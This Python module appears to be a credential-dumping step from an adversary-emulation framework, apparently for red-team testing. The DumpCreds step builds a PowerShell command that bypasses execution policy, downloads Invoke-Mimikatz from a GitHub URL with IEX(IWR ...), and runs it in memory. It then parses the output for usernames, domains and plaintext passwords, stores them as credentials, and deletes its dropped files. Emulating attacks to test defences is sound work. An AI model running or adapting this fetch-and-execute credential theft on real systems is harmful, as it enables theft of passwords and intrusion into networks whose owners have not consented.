from plugins.adversary.app.operation.operation import Step, OPDomain, OPCredential, OPRat, OPVar, OPHost, OPUser, OPFile
from plugins.adversary.app.commands import *
from plugins.adversary.app.custom import *

class DumpCreds(Step):
    """    Description:
            This step uses Invoke-Mimikatz to get credentials of the current system.
           Requirements:
            An elevated RAT.
    """
    display_name = "dump_creds"
    summary = "Run Invoke-Mimikatz to obtain credentials."
    attack_mapping = [('T1003', 'Credential Access'), ('T1064', 'Defense Evasion'), ('T1064', 'Execution'), ('T1086', 'Execution'), ('T1106', 'Execution')]

    preconditions = [("rat", OPRat({"elevated": True})),
                     ("host", OPHost(OPVar("rat.host")))]
    postconditions = [("domain_g", OPDomain),
                      ("credential_g", OPCredential),
                      ("host_g", OPHost),
                      ("user_g", OPUser({'$in': OPVar("host.admins")})),
                      ("file_g", OPFile)]

    postproperties = ["credential_g.password", "user_g.username", "user_g.is_group", "domain_g.windows_domain"]

    hints = [("user_g", OPUser({'$in': OPVar('host_g.admins'), "domain": OPVar("domain_g")})),
             ("credential_g", OPCredential({"user": OPVar("user_g")}))]

    significant_parameters = ["host"]

    @staticmethod
    def description(rat):
        return "Running mimikatz to dump credentials on {}".format(rat.host.fqdn)

    @staticmethod
    def parser(mimikatz_output):
        credentials = []
        results = re.findall('Username\s*:\s+(.*)\s*\* Domain\s*:\s+(.*)\s*\* Password\s*:\s+(.*)', mimikatz_output, re.MULTILINE)

        for result in results:
            if not result[2] or result[2] == '(null)':
                continue
            credentials.append({'username': result[0].lower().strip(), 'domain': result[1].lower().strip(), 'password': result[2].strip()})

        return credentials

    @staticmethod
    async def action(operation, rat, domain_g, credential_g, host_g, user_g, file_g):
        # Step 1: run Mimikatz in memory
        MIMIKATZ_URL = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1"
        ps_parameters = ['powershell.exe', '-exec', 'bypass', '-C', 'IEX(IWR \'{}\'); Invoke-Mimikatz -DumpCreds'.format(MIMIKATZ_URL)]

        async def drop_file(path, contents):
            await operation.drop_file_contents(rat, file_path_dest=path, file_contents=bytes(contents, 'utf-8'))
        async def register_file(path):
            await file_g({'path': path, 'host': rat.host})

        cmd = command.CustomCommandLine(ps_parameters)
        await cmd.generate(drop_file, register_file)

        credentials = (await operation.execute_shell_command(rat, cmd, DumpCreds.parser))

        # Step 2: parse credentials
        users = []
        for cred in credentials:
            # Generate User object
            user = {'username': cred['username'], 'is_group': False}
            if cred['domain'].upper() == rat.host.hostname.upper():
                user['host'] = rat.host
            else:
                user['domain'] = await domain_g({'windows_domain': cred['domain']})

            user_obj = await user_g(user)

            # Generate Credential object
            await credential_g({'password': cred['password'], 'found_on_host': rat.host, 'user': user_obj})

        return True

    @staticmethod
    async def cleanup(cleaner, file_g):
        for entry in file_g:
            await cleaner.delete(entry)
